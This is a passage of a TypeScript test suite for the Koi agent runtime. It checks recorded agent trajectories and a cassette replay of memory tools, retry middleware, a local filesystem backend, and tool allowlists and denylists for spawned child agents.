    expect(doc.schema_version).toBe("ATIF-v1.6");
    expect(doc.session_id).toBe("memory-store");
    expect(doc.agent.model_name).toBe("google/gemini-2.0-flash-001");
    expect(doc.agent.tool_definitions?.some((t) => t.name === "memory_store")).toBe(true);
    expect(doc.agent.tool_definitions?.some((t) => t.name === "memory_recall")).toBe(true);
    expect(doc.agent.tool_definitions?.some((t) => t.name === "memory_search")).toBe(true);
    expect(doc.agent.tool_definitions?.some((t) => t.name === "memory_delete")).toBe(true);
  });

  test("MCP lifecycle + MW spans present", async () => {
    const doc = (await Bun.file(`${FIXTURES}/memory-store.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const mcpSteps = doc.steps.filter((s) => s.extra?.type === "mcp_lifecycle");
    expect(mcpSteps.length).toBeGreaterThanOrEqual(2);

    const permSpans = doc.steps.filter(
      (s) => s.extra?.type === "middleware_span" && s.extra?.middlewareName === "permissions",
    );
    expect(permSpans.length).toBeGreaterThan(0);

    const hookDispatchSpans = doc.steps.filter(
      (s) => s.extra?.type === "middleware_span" && s.extra?.middlewareName === "hooks",
    );
    expect(hookDispatchSpans.length).toBeGreaterThan(0);
  });

  test("memory_store tool output contains full serialized frontmatter and multiline body", async () => {
    const doc = (await Bun.file(`${FIXTURES}/memory-store.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };

    const toolSteps = doc.steps.filter(
      (s) => s.source === "tool" && s.observation?.results !== undefined,
    );
    expect(toolSteps.length).toBeGreaterThanOrEqual(2); // memory_store + memory_recall (memory_search optional)

    // memory_store output contains stored: true and filePath
    const storeStep = toolSteps.find((s) => {
      const content = s.observation?.results?.[0]?.content ?? "";
      return content.includes("stored") && content.includes("filePath");
    });
    expect(storeStep).toBeDefined();
    const storeContent = storeStep?.observation?.results?.[0]?.content ?? "";
    expect(storeContent).toContain("testing_approach.md");
    expect(storeContent).toContain('"stored":true');
  });

  test("memory_recall and memory_search tools return stored records", async () => {
    const doc = (await Bun.file(`${FIXTURES}/memory-store.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };

    const toolSteps = doc.steps.filter(
      (s) => s.source === "tool" && s.observation?.results !== undefined,
    );

    // At least one tool step should contain "results" (from recall or search)
    const resultStep = toolSteps.find((s) => {
      const content = s.observation?.results?.[0]?.content ?? "";
      return content.includes("results") && content.includes("testing approach");
    });
    expect(resultStep).toBeDefined();
  });

  test("hook executions fire on tool.succeeded", async () => {
    const doc = (await Bun.file(`${FIXTURES}/memory-store.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const hookSteps = doc.steps.filter((s) => s.extra?.type === "hook_execution");
    // At least 2 hook executions (one per tool call: store + recall minimum)
    expect(hookSteps.length).toBeGreaterThanOrEqual(2);
    expect(hookSteps[0]?.extra?.hookName).toBe("on-tool-exec");
  });

  test("model calls: initial intent + final summary (>= 2 model steps)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/memory-store.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly model_name?: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };

    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    expect(modelSteps.length).toBeGreaterThanOrEqual(2);

    // Final model response should reference the stored memory
    const finalResponse =
      modelSteps[modelSteps.length - 1]?.observation?.results?.[0]?.content ?? "";
    expect(finalResponse.length).toBeGreaterThan(0);
  });

  test("step count: MCP + MW + HOOK + MODEL + TOOL (>= 12)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/memory-store.trajectory.json`).json()) as {
      readonly steps: readonly unknown[];
    };
    // 36 steps recorded: 2 MCP + 4 MODEL + 3 TOOL + 3 HOOK + MW spans
    expect(doc.steps.length).toBeGreaterThanOrEqual(20);
  });
});

// ---------------------------------------------------------------------------
// Full-loop replay: memory-store cassette → createKoi → live ATIF
// ---------------------------------------------------------------------------

describe("Full-loop replay: memory-store cassette → createKoi → live ATIF", () => {
  test("produces live ATIF with memory_store + memory_recall tool calls and correct output", async () => {
    const { memoryRecordId: mkId } = await import("@koi/core");
    const { createMemoryToolProvider: createProvider } = await import("@koi/memory-tools");
    type MRecord = import("@koi/core").MemoryRecord;
    type MInput = import("@koi/core").MemoryRecordInput;

    // In-memory backend for replay
    const records = new Map<string, MRecord>();
    // let: mutable counter
    let counter = 0;
    const backend = {
      store: (input: MInput) => {
        counter += 1;
        const id = mkId(`mem-${counter}`);
        const filePath = `${input.name.toLowerCase().replace(/\s+/g, "_")}.md`;
        const now = Date.now();
        const record: MRecord = { id, ...input, filePath, createdAt: now, updatedAt: now };
        records.set(id, record);
        return { ok: true as const, value: record };
      },
      storeWithDedup: (input: MInput, opts: { readonly force: boolean }) => {
        const match = [...records.values()].find(
          (r) => r.name === input.name && r.type === input.type,
        );
        if (match !== undefined) {
          if (!opts.force) {
            return { ok: true as const, value: { action: "conflict" as const, existing: match } };
          }
          const updated = {
            ...match,
            description: input.description,
            content: input.content,
            updatedAt: Date.now(),
          } as MRecord;
          records.set(match.id, updated);
          return { ok: true as const, value: { action: "updated" as const, record: updated } };
        }
        counter += 1;
        const id = mkId(`mem-${counter}`);
        const filePath = `${input.name.toLowerCase().replace(/\s+/g, "_")}.md`;
        const now = Date.now();
        const record: MRecord = { id, ...input, filePath, createdAt: now, updatedAt: now };
        records.set(id, record);
        return { ok: true as const, value: { action: "created" as const, record } };
      },
      recall: () => ({ ok: true as const, value: [...records.values()] }),
      search: () => ({ ok: true as const, value: [...records.values()] }),
      delete: (id: import("@koi/core").MemoryRecordId) => {
        const wasPresent = records.has(id);
        records.delete(id);
        return { ok: true as const, value: { wasPresent } };
      },
      findByName: (name: string) => ({
        ok: true as const,
        value: [...records.values()].find((r) => r.name === name),
      }),
      get: (id: import("@koi/core").MemoryRecordId) => ({
        ok: true as const,
        value: records.get(id),
      }),
      update: (
        id: import("@koi/core").MemoryRecordId,
        patch: import("@koi/core").MemoryRecordPatch,
      ) => {
        const existing = records.get(id);
        if (!existing)
          return {
            ok: false as const,
            error: { code: "NOT_FOUND" as const, message: "not found", retryable: false },
          };
        const updated = { ...existing, ...patch, updatedAt: Date.now() } as MRecord;
        records.set(id, updated);
        return { ok: true as const, value: updated };
      },
    };

    const providerResult = createProvider({ backend, memoryDir: "/tmp/koi-memory" });
    if (!providerResult.ok)
      throw new Error(`createMemoryToolProvider failed: ${providerResult.error.message}`);
    const memProvider = providerResult.value;

    // Extract tools for dispatch map
    const attachResult = await memProvider.attach({} as Parameters<typeof memProvider.attach>[0]);
    const components = "components" in attachResult ? attachResult.components : attachResult;
    const toolMap: Record<string, (args: JsonObject) => Promise<unknown>> = {};
    for (const [, v] of components) {
      const tool = v as {
        readonly descriptor?: { readonly name: string };
        readonly execute?: (args: JsonObject) => Promise<unknown>;
      };
      if (tool.descriptor?.name && tool.execute) {
        toolMap[tool.descriptor.name] = tool.execute;
      }
    }

    // Load cassette
    const cassette = await loadCassette(`${FIXTURES}/memory-store.cassette.json`);
    const trajDir = `/tmp/koi-replay-memory-${Date.now()}`;
    trajDirs.push(trajDir);
    const docId = "replay-memory-store";

    const store = createAtifDocumentStore(
      { agentName: "replay-memory-test" },
      createFsAtifDelegate(trajDir),
    );
    const clock = createMonotonicClock();

    const { middleware: eventTrace } = createEventTraceMiddleware({
      store,
      docId,
      agentName: "replay-memory-test",
      clock,
    });

    const hookResult = loadHooks([
      {
        kind: "command",
        name: "on-tool-exec",
        cmd: ["echo", "hook"],
        filter: { events: ["tool.succeeded"] },
      },
    ]);
    const loadedHooks2 = hookResult.ok ? hookResult.value : [];
    const { onExecuted: onExecuted2, middleware: hookObserverMw2 } = createHookObserver({
      store,
      docId,
      clock,
    });
    const hookMw = createHookMiddleware({ hooks: loadedHooks2, onExecuted: onExecuted2 });

    const permBackend = createPermissionBackend({
      mode: "bypass",
      rules: [{ pattern: "*", action: "*", effect: "allow", source: "policy" }],
    });
    const permHandle = createPermissionsMiddleware({
      backend: permBackend,
      description: "replay test (bypass)",
    });

    const mcpSm = createTransportStateMachine();
    const unsubMcp = recordMcpLifecycle({
      stateMachine: mcpSm,
      store,
      docId,
      serverName: "test-mcp",
      clock,
    });
    mcpSm.transition({ kind: "connecting", attempt: 1 });
    mcpSm.transition({ kind: "connected" });

    // Multi-tool cassette adapter
    // let: mutable call counter
    let callCount = 0;
    const adapter: EngineAdapter = {
      engineId: "cassette-replay-memory",
      capabilities: { text: true, images: false, files: false, audio: false },
      terminals: {
        modelCall: async (_request: ModelRequest): Promise<ModelResponse> => ({
          content: "fallback",
          model: MODEL,
        }),
        modelStream: (request: ModelRequest): AsyncIterable<ModelChunk> => {
          const currentCall = callCount;
          callCount++;
          if (currentCall === 0) {
            return toAsyncIterable(cassette.chunks);
          }
          // Subsequent turns: derive response from accumulated messages to validate
          // the runtime correctly passes tool output to the model. Extract the last
          // tool result from messages to prove integration path works.
          const msgs = request.messages ?? [];
          const lastToolMsg = [...msgs].reverse().find((m) => m.senderId === "tool");
          const toolContent =
            lastToolMsg?.content?.[0]?.kind === "text" ? lastToolMsg.content[0].text : "";
          const summary = toolContent.includes("results")
            ? "Retrieved memories successfully."
            : toolContent.includes("stored")
              ? "Stored feedback memory at testing_approach.md."
              : "Done.";
          return toAsyncIterable([
            { kind: "text_delta" as const, delta: summary },
            {
              kind: "done" as const,
              response: {
                content: summary,
                model: MODEL,
                usage: { inputTokens: msgs.length * 10, outputTokens: 5 },
              },
            },
          ]);
        },
        toolCall: async (request: ToolRequest): Promise<ToolResponse> => {
          const fn = toolMap[request.toolId];
          if (!fn) throw new Error(`Unknown tool: ${request.toolId}`);
          const output = await fn(request.input);
          return { output };
        },
      },
      stream(input: EngineInput): AsyncIterable<EngineEvent> {
        const h = input.callHandlers;
        if (!h) {
          return (async function* () {
            yield {
              kind: "done" as const,
              output: {
                content: [],
                stopReason: "error" as const,
                metrics: {
                  totalTokens: 0,
                  inputTokens: 0,
                  outputTokens: 0,
                  turns: 0,
                  durationMs: 0,
                },
                metadata: { error: "No callHandlers" },
              },
            };
          })();
        }
        const text = input.kind === "text" ? input.text : "";
        const msgs: {
          readonly senderId: string;
          readonly timestamp: number;
          readonly content: readonly { readonly kind: "text"; readonly text: string }[];
          readonly metadata?: JsonObject;
        }[] = [{ senderId: "user", timestamp: Date.now(), content: [{ kind: "text", text }] }];
        return (async function* () {
          // let: mutable
          let turn = 0;
          while (turn < 3) {
            const evts: EngineEvent[] = [];
            // let: mutable
            let done: EngineEvent | undefined;
            for await (const e of consumeModelStream(
              h.modelStream
                ? h.modelStream({ messages: msgs, model: MODEL })
                : (async function* (): AsyncIterable<ModelChunk> {
                    const r = await h.modelCall({ messages: msgs, model: MODEL });
                    yield { kind: "done" as const, response: { content: r.content, model: MODEL } };
                  })(),
              input.signal,
            )) {
              if (e.kind === "done") done = e;
              else {
                evts.push(e);
                yield e;
              }
            }
            const tcs = evts.filter((e) => e.kind === "tool_call_end");
            if (tcs.length === 0) {
              if (done) yield done;
              break;
            }
            for (const tc of tcs) {
              if (tc.kind !== "tool_call_end") continue;
              const r = tc.result as {
                readonly toolName: string;
                readonly parsedArgs?: JsonObject;
              };
              if (!r.parsedArgs) continue;
              const realCallId = tc.callId as string;
              msgs.push({
                senderId: "assistant",
                timestamp: Date.now(),
                content: [{ kind: "text", text: "" }],
                metadata: { callId: realCallId, toolName: r.toolName } as JsonObject,
              });
              const resp = await h.toolCall({ toolId: r.toolName, input: r.parsedArgs });
              const out =
                typeof resp.output === "string" ? resp.output : JSON.stringify(resp.output);
              msgs.push({
                senderId: "tool",
                timestamp: Date.now(),
                content: [{ kind: "text", text: out }],
                metadata: { callId: realCallId, toolName: r.toolName } as JsonObject,
              });
            }
            turn++;
          }
          yield {
            kind: "done" as const,
            output: {
              content: [],
              stopReason: "max_turns" as const,
              metrics: {
                totalTokens: 0,
                inputTokens: 0,
                outputTokens: 0,
                turns: 0,
                durationMs: 0,
              },
            },
          };
        })();
      },
    };

    const runtime = await createKoi({
      manifest: { name: "replay-memory-test", version: "0.1.0", model: { name: MODEL } },
      adapter,
      middleware: [eventTrace, hookMw, hookObserverMw2, permHandle].map((mw) =>
        wrapMiddlewareWithTrace(mw, { store, docId, clock }),
      ),
      providers: [memProvider],
      loopDetection: false,
    });

    for await (const _e of runtime.run({
      kind: "text",
      text: 'Use the memory_store tool to store a feedback memory with name "testing approach", description "always write failing tests first", type "feedback", and content "Rule: write failing tests before implementation.". Then use the memory_recall tool with query "testing" to retrieve it.',
    })) {
      /* drain */
    }

    unsubMcp();
    mcpSm.transition({ kind: "closed" });
    await runtime.dispose();
    await new Promise((r) => setTimeout(r, 300));

    // Validate live ATIF from cassette replay
    const steps = await store.getDocument(docId);

    // MCP lifecycle
    const mcpSteps = steps.filter((s) => s.metadata?.type === "mcp_lifecycle");
    expect(mcpSteps.length).toBeGreaterThanOrEqual(2);

    // Tool call steps — memory_store executed with correct output
    const memoryStoreSteps = steps.filter(
      (s) => s.kind === "tool_call" && s.identifier === "memory_store",
    );
    expect(memoryStoreSteps.length).toBeGreaterThan(0);
    expect(memoryStoreSteps[0]?.outcome).toBe("success");
    const storeOutput = memoryStoreSteps[0]?.response?.text ?? "";
    expect(storeOutput).toContain("testing_approach.md");
    expect(storeOutput).toContain('"stored":true');

    // In-memory backend correctly populated
    expect(records.size).toBeGreaterThan(0);
    const storedRecord = [...records.values()][0];
    expect(storedRecord?.name).toBe("testing approach");
    expect(storedRecord?.type).toBe("feedback");

    // Final model turn: derived from tool output, not hardcoded
    const modelSteps = steps.filter(
      (s) => s.kind === "model_call" && !s.identifier.startsWith("middleware:"),
    );
    expect(modelSteps.length).toBeGreaterThanOrEqual(2); // initial intent + post-tool summary
    const finalModel = modelSteps[modelSteps.length - 1];
    const finalText = finalModel?.response?.text ?? "";
    // Proves the second turn saw real tool output (not a hardcoded stub)
    expect(finalText.length).toBeGreaterThan(0);
    expect(finalText.includes("testing_approach.md") || finalText.includes("memories")).toBe(true);

    // Hook + MW spans present
    const hookSteps = steps.filter((s) => s.metadata?.type === "hook_execution");
    expect(hookSteps.length).toBeGreaterThan(0);
    const mwSpans = steps.filter((s) => s.metadata?.type === "middleware_span");
    const mwNames = new Set(mwSpans.map((s) => s.metadata?.middlewareName));
    expect(mwNames.has("permissions")).toBe(true);
    expect(mwNames.has("hooks")).toBe(true);
  }, 15000);
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/middleware-semantic-retry (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/middleware-semantic-retry", () => {
  test("createSemanticRetryMiddleware produces a valid KoiMiddleware", async () => {
    const { createSemanticRetryMiddleware } = await import("@koi/middleware-semantic-retry");

    const handle = createSemanticRetryMiddleware({});
    expect(handle.middleware.name).toBe("semantic-retry");
    expect(handle.middleware.priority).toBe(420);
    expect(handle.middleware.wrapModelCall).toBeDefined();
    expect(handle.middleware.wrapModelStream).toBeDefined();
    expect(handle.middleware.wrapToolCall).toBeDefined();
    expect(handle.middleware.onSessionStart).toBeDefined();
    expect(handle.middleware.onSessionEnd).toBeDefined();
    expect(handle.middleware.describeCapabilities).toBeDefined();
  });

  test("createRetrySignalBroker provides consume-once semantics", async () => {
    const { createRetrySignalBroker } = await import("@koi/middleware-semantic-retry");

    const broker = createRetrySignalBroker();
    const signal = {
      retrying: true as const,
      originTurnIndex: 0,
      reason: "test failure",
      failureClass: "unknown",
      attemptNumber: 1,
    };

    // Set and get
    broker.setRetrySignal("s1", signal);
    expect(broker.getRetrySignal("s1")).toEqual(signal);

    // Consume returns and clears atomically
    const consumed = broker.consumeRetrySignal("s1");
    expect(consumed).toEqual(signal);
    expect(broker.getRetrySignal("s1")).toBeUndefined();

    // Second consume returns undefined
    expect(broker.consumeRetrySignal("s1")).toBeUndefined();
  });
});

describe("Golden: @koi/fs-local", () => {
  test("createLocalFileSystem returns a FileSystemBackend with all operations", async () => {
    const { mkdtempSync, rmSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const { createLocalFileSystem } = await import("@koi/fs-local");

    const tmp = mkdtempSync(join(tmpdir(), "koi-golden-local-test-"));
    try {
      const backend = createLocalFileSystem(tmp);

      expect(backend.name).toBe("local");
      expect(typeof backend.read).toBe("function");
      expect(typeof backend.write).toBe("function");
      expect(typeof backend.edit).toBe("function");
      expect(typeof backend.list).toBe("function");
      expect(typeof backend.search).toBe("function");
      expect(typeof backend.delete).toBe("function");
      expect(typeof backend.rename).toBe("function");
      expect(typeof backend.dispose).toBe("function");
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  });

  test("round-trip write/read through local filesystem", async () => {
    const { mkdtempSync, rmSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const { createLocalFileSystem } = await import("@koi/fs-local");

    const tmp = mkdtempSync(join(tmpdir(), "koi-golden-local-rw-"));
    try {
      const backend = createLocalFileSystem(tmp);

      const writeResult = await backend.write("golden/test.txt", "golden local content");
      expect(writeResult.ok).toBe(true);

      const readResult = await backend.read("golden/test.txt");
      expect(readResult.ok).toBe(true);
      if (readResult.ok) {
        expect(readResult.value.content).toBe("golden local content");
        expect(readResult.value.path).toBe("golden/test.txt");
      }
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  });

  test("ATIF trajectory: local_fs_read tool call captured", () => {
    const { existsSync, readFileSync } = require("node:fs") as typeof import("node:fs");
    const trajectoryPath = `${FIXTURES}/local-fs-read.trajectory.json`;
    if (!existsSync(trajectoryPath)) {
      throw new Error(
        "local-fs-read.trajectory.json not found. Re-record:\n" +
          "  OPENROUTER_API_KEY=sk-... bun run packages/meta/runtime/scripts/record-cassettes.ts",
      );
    }

    const trajectory = JSON.parse(readFileSync(trajectoryPath, "utf-8")) as {
      readonly steps?: readonly {
        readonly source?: string;
        readonly tool_calls?: readonly { readonly function_name?: string }[];
      }[];
    };

    expect(trajectory.steps).toBeDefined();
    const steps = trajectory.steps ?? [];

    // Should have a tool step with local_fs_read
    const toolSteps = steps.filter((s) => s.source === "tool");
    expect(toolSteps.length).toBeGreaterThanOrEqual(1);

    const hasLocalFsRead = toolSteps.some((s) =>
      s.tool_calls?.some((tc) => tc.function_name === "local_fs_read"),
    );
    expect(hasLocalFsRead).toBe(true);

    // Should have agent steps (model calls)
    const agentSteps = steps.filter((s) => s.source === "agent");
    expect(agentSteps.length).toBeGreaterThanOrEqual(1);
  });
});

// ---------------------------------------------------------------------------
// Golden: spawn inheritance — @koi/core L0 types + validateSpawnRequest (#1425)
// Standalone queries (no LLM, no cassette — pure unit-style in @koi/runtime context)
// ---------------------------------------------------------------------------

describe("Golden: @koi/engine spawn inheritance", () => {
  test("validateSpawnRequest accepts valid requests and rejects allowlist+denylist conflict", async () => {
    const { validateSpawnRequest } = await import("@koi/core");

    // Valid: no lists
    const valid = validateSpawnRequest({
      agentName: "researcher",
      description: "do research",
      signal: AbortSignal.timeout(1000),
    });
    expect(valid.ok).toBe(true);

    // Valid: denylist only
    const withDeny = validateSpawnRequest({
      agentName: "researcher",
      description: "do research",
      signal: AbortSignal.timeout(1000),
      toolDenylist: ["dangerous_tool"],
    });
    expect(withDeny.ok).toBe(true);

    // Invalid: both lists set simultaneously
    const conflict = validateSpawnRequest({
      agentName: "researcher",
      description: "do research",
      signal: AbortSignal.timeout(1000),
      toolAllowlist: ["safe_tool"],
      toolDenylist: ["dangerous_tool"],
    });
    expect(conflict.ok).toBe(false);
    if (!conflict.ok) {
      expect(conflict.error.code).toBe("VALIDATION");
      expect(conflict.error.retryable).toBe(false);
      expect(conflict.error.message).toContain("mutually exclusive");
    }
  });

  test("ManifestSpawnConfig shape: allowlist mode + env exclude + channel policy", async () => {
    const { DEFAULT_SPAWN_CHANNEL_POLICY } = await import("@koi/core");

    // Verify ManifestSpawnConfig values satisfy the expected shapes.
    const manifestSpawn = {
      tools: { policy: "allowlist" as const, list: ["ToolA", "ToolB"] },
      env: { exclude: ["SENSITIVE_KEY"] },
      channels: DEFAULT_SPAWN_CHANNEL_POLICY,
    };

    expect(manifestSpawn.tools.policy).toBe("allowlist");
    expect(manifestSpawn.tools.list).toContain("ToolA");
    expect(manifestSpawn.env.exclude).toContain("SENSITIVE_KEY");
    expect(manifestSpawn.channels.mode).toBe("output-only");
    expect(manifestSpawn.channels.attribution).toBe("metadata");

    // SpawnInheritanceConfig shape
    const inheritanceConfig = {
      channels: { mode: "all" as const, attribution: "metadata" as const },
      env: { overrides: { SAFE_KEY: "new-value", REMOVED_KEY: undefined } },
      priority: 15,
    };

    expect(inheritanceConfig.channels.mode).toBe("all");
    expect(inheritanceConfig.env.overrides.SAFE_KEY).toBe("new-value");
    expect(inheritanceConfig.env.overrides.REMOVED_KEY).toBeUndefined();
    expect(inheritanceConfig.priority).toBe(15);
  });
});

// ---------------------------------------------------------------------------
// spawn-inheritance ATIF trajectory (golden file) — #1425
//
// Key design: child agent (researcher) shares the parent's ATIF store via
// inheritedMiddleware, so child model calls appear in the same trajectory
// with the child's own identity. This lets us assert on the child's
// ModelRequest.tools — proving Glob is absent at the model-request boundary.
// ---------------------------------------------------------------------------

type SpawnInheritanceStep = {
  readonly step_id: number;
  readonly source?: string;
  readonly outcome?: string;
  readonly message?: string;
  readonly extra?: {
    readonly tools?: readonly { readonly name: string }[];
    readonly requestModel?: string;
    readonly responseModel?: string;
  };
  readonly tool_calls?: readonly {
    readonly function_name?: string;
    readonly arguments?: Record<string, unknown>;
  }[];
  readonly observation?: { readonly results?: readonly { readonly content?: string }[] };
};

describe("spawn-inheritance ATIF trajectory (golden file)", () => {
  const path = `${FIXTURES}/spawn-inheritance.trajectory.json`;

  test("valid ATIF v1.6 with shared parent+child trajectory", async () => {
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) {
      throw new Error(
        "spawn-inheritance.trajectory.json not found. Re-record:\n" +
          "  OPENROUTER_API_KEY=sk-... bun scripts/record-cassettes.ts",
      );
    }
    const doc = (await Bun.file(path).json()) as Record<string, unknown>;
    expect(doc.schema_version).toBe("ATIF-v1.6");
  });

  test("parent model call offers Glob — child model call does not (proves denylist at ModelRequest level)", async () => {
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) return;

    const doc = (await Bun.file(path).json()) as {
      readonly steps: readonly SpawnInheritanceStep[];
    };

    const agentSteps = doc.steps.filter((s) => s.source === "agent");

    // Parent model call: should have Glob in its tool list
    const parentStep = agentSteps.find(
      (s) =>
        s.extra?.tools?.some((t) => t.name === "Spawn") &&
        s.extra?.tools?.some((t) => t.name === "Glob"),
    );
    expect(parentStep).toBeDefined();
    const parentTools = parentStep?.extra?.tools?.map((t) => t.name) ?? [];
    expect(parentTools).toContain("Glob");
    expect(parentTools).toContain("Grep");
    expect(parentTools).toContain("ToolSearch");
    expect(parentTools).toContain("Spawn");

    // Child model call (researcher): Glob MUST be absent — this is the key assertion.
    // The child's message IS the delegated task and starts with "List your available tools".
    // The parent's message starts with "You have Glob" — so startsWith distinguishes them.
    const childStep = agentSteps.find((s) => s.message?.startsWith("List your available tools"));
    expect(childStep).toBeDefined();
    const childTools = childStep?.extra?.tools?.map((t) => t.name) ?? [];
    expect(childTools).not.toContain("Glob"); // denied — absent from ModelRequest.tools
    expect(childTools).toContain("Grep"); // inherited (not denied)
    expect(childTools).toContain("ToolSearch"); // inherited (not denied)
    // Spawn present (fresh provider for recursive delegation)
    expect(childTools).toContain("Spawn");
  });

  test("Spawn tool called with toolDenylist=['Glob'] and child returned output", async () => {
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) return;

    const doc = (await Bun.file(path).json()) as {
      readonly steps: readonly SpawnInheritanceStep[];
    };
    const spawnStep = doc.steps
      .filter((s) => s.source === "tool")
      .find((s) => s.tool_calls?.some((tc) => tc.function_name === "Spawn"));

    expect(spawnStep).toBeDefined();
    expect(spawnStep?.outcome).toBe("success");

    const spawnCall = spawnStep?.tool_calls?.find((tc) => tc.function_name === "Spawn");
    expect(spawnCall?.arguments?.agentName).toBe("researcher");
    expect((spawnCall?.arguments?.toolDenylist as string[]).includes("Glob")).toBe(true);

    const result = spawnStep?.observation?.results?.[0]?.content;
    expect(result).toBeDefined();
    expect(result?.length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// memory-recall trajectory: @koi/memory recallMemories full-stack ATIF
// ---------------------------------------------------------------------------

describe("memory-recall ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with memory_recall tool definition", async () => {
    const doc = (await Bun.file(`${FIXTURES}/memory-recall.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly session_id: string;
      readonly agent: {
        readonly model_name?: string;
        readonly tool_definitions?: readonly { readonly name: string }[];
      };
    };

    expect(doc.schema_version).toBe("ATIF-v1.6");
    expect(doc.session_id).toBe("memory-recall");
    expect(doc.agent.model_name).toBe("google/gemini-2.0-flash-001");
    expect(doc.agent.tool_definitions?.some((t) => t.name === "memory_recall")).toBe(true);
  });

  test("memory_recall tool output contains recalled memories with formatting", async () => {
    const doc = (await Bun.file(`${FIXTURES}/memory-recall.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };

    const toolSteps = doc.steps.filter(
      (s) => s.source === "tool" && s.observation?.results !== undefined,
    );
    expect(toolSteps.length).toBeGreaterThanOrEqual(1);

    const recallStep = toolSteps.find((s) => {
      const content = s.observation?.results?.[0]?.content ?? "";
      return content.includes("selected") && content.includes("formatted");
    });
    expect(recallStep).toBeDefined();
    const content = recallStep?.observation?.results?.[0]?.content ?? "";

    // Parse tool output as JSON for structural validation
    const parsed = JSON.parse(content) as {
      readonly selected: number;
      readonly totalScanned: number;
      readonly degraded: boolean;
      readonly candidateLimitHit: boolean;
      readonly formatted: string;
    };

    // Validate recall returned all 3 memories
    expect(parsed.selected).toBe(3);
    expect(parsed.totalScanned).toBe(3);
    expect(parsed.degraded).toBe(false);
    expect(parsed.candidateLimitHit).toBe(false);

    // Validate formatted output uses static heading (not user-controlled name)
    expect(parsed.formatted).toContain("### Memory entry");
    expect(parsed.formatted).not.toContain("### Testing feedback (feedback)");
    expect(parsed.formatted).not.toContain("### User role (user)");
    expect(parsed.formatted).not.toContain("### Project goal (project)");

    // Validate each memory block: JSON metadata line + --- separator + content
    const blocks = parsed.formatted.split("### Memory entry").slice(1);
    expect(blocks.length).toBe(3);
    for (const block of blocks) {
      // Each block must have <memory-data> with JSON metadata then --- then content
      expect(block).toContain("<memory-data>");
      expect(block).toContain("</memory-data>");
      const inner = block.slice(
        block.indexOf("<memory-data>\n") + "<memory-data>\n".length,
        block.indexOf("\n</memory-data>"),
      );
      const [metaLine, separator, ...contentLines] = inner.split("\n");
      // First line must be parseable JSON with name and type
      const meta = JSON.parse(metaLine ?? "");
      expect(typeof meta.name).toBe("string");
      expect(typeof meta.type).toBe("string");
      // Second line must be the --- separator
      expect(separator).toBe("---");
      // Content must follow
      expect(contentLines.length).toBeGreaterThan(0);
    }
  });

  test("no legacy headings in any trajectory step (including truncated middleware spans)", async () => {
    // Checks the raw fixture text so even middleware spans with truncated JSON
    // (intentionally truncated by event-trace) are covered. Only the tool step (9)
    // and agent message (14) carry complete JSON; middleware spans (8, 10-13) are
    // truncated by design but must still use new-format headings in their prefix.
    const raw = await Bun.file(`${FIXTURES}/memory-recall.trajectory.json`).text();
    expect(raw).not.toContain("### Testing feedback (feedback)");
    expect(raw).not.toContain("### User role (user)");
    expect(raw).not.toContain("### Project goal (project)");
  });

  test("step count: MCP + MW + HOOK + MODEL + TOOL (>= 8)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/memory-recall.trajectory.json`).json()) as {
      readonly steps: readonly unknown[];
    };
    expect(doc.steps.length).toBeGreaterThanOrEqual(8);
  });
});

// ---------------------------------------------------------------------------
// spawn-allowlist ATIF trajectory (golden file) — #1425
// Proves runtime toolAllowlist enforced at ModelRequest level via Spawn tool.
// ---------------------------------------------------------------------------

describe("spawn-allowlist ATIF trajectory (golden file)", () => {
  const path = `${FIXTURES}/spawn-allowlist.trajectory.json`;

  test("child model call contains only allowlisted tool (Grep) — not Glob or ToolSearch", async () => {
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) {
      throw new Error(
        "spawn-allowlist.trajectory.json not found. Re-record:\n" +
          "  OPENROUTER_API_KEY=sk-... bun scripts/record-cassettes.ts",
      );
    }

    const doc = (await Bun.file(path).json()) as {
      readonly steps: readonly SpawnInheritanceStep[];
    };
    const agentSteps = doc.steps.filter((s) => s.source === "agent");

    // Parent has all tools
    const parentStep = agentSteps.find(
      (s) =>
        s.extra?.tools?.some((t) => t.name === "Glob") &&
        s.extra?.tools?.some((t) => t.name === "Spawn"),
    );
    expect(parentStep?.extra?.tools?.map((t) => t.name)).toContain("Glob");

    // Child: only Grep (toolAllowlist=["Grep"] — no Glob, no ToolSearch)
    const childStep = agentSteps.find((s) => s.message?.startsWith("List your available tools"));
    expect(childStep).toBeDefined();
    const childTools = childStep?.extra?.tools?.map((t) => t.name) ?? [];
    expect(childTools).toContain("Grep");
    expect(childTools).not.toContain("Glob");
    expect(childTools).not.toContain("ToolSearch");
  });
});

// ---------------------------------------------------------------------------
// spawn-manifest-ceiling ATIF trajectory (golden file) — #1425
// Proves manifest.spawn.tools.policy=allowlist enforced by engine without
// any runtime toolAllowlist — ceiling from YAML alone.
// ---------------------------------------------------------------------------

describe("spawn-manifest-ceiling ATIF trajectory (golden file)", () => {
